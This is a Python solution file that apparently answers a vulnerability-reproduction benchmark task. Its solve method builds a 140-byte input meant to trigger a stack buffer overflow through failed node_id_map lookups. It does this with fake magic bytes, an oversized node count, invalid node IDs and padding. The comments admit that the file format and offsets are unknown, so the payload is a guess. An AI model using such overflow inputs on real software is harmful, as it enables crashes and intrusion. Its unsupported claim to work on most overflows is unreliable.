import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description, we need to trigger
        # a stack buffer overflow by causing node_id_map lookup failures.
        # The ground-truth length is 140 bytes, so we create a payload
        # of exactly that length that should exploit the issue.
        
        # Typical stack buffer overflow exploit structure:
        # 1. Fill buffer to its capacity
        # 2. Overwrite saved return address
        # 3. Add shellcode or trigger crash
        
        # Since we need exactly 140 bytes and don't know exact offsets,
        # we'll create a pattern that should overflow any reasonable buffer
        # and cause a crash when node_id_map lookups fail.
        
        # Create a payload with:
        # - Some header/magic bytes that might be expected
        # - Malicious node references that don't exist in node_id_map
        # - Padding to reach 140 bytes
        
        # Without the actual binary format, we'll create a generic
        # overflow payload that should work for most stack overflows
        
        payload = b""
        
        # Add some initial valid data (if needed by parser)
        # Many binary formats start with magic bytes
        payload += b"MEM\x00"  # Fake magic
        
        # Add version or header size
        payload += struct.pack("<I", 1)  # Version 1
        
        # Create node count that references non-existent nodes
        # This should trigger the vulnerability when iterator is dereferenced
        payload += struct.pack("<I", 0xFFFFFFFF)  # Large node count
        
        # Add node references with invalid IDs
        # These should cause node_id_map lookup failures
        for i in range(32):  # Enough to fill to 140 bytes
            payload += struct.pack("<I", 0xDEADBEEF + i)
        
        # Ensure exact length of 140 bytes
        payload = payload[:140]
        if len(payload) < 140:
            payload += b"A" * (140 - len(payload))
        
        return payload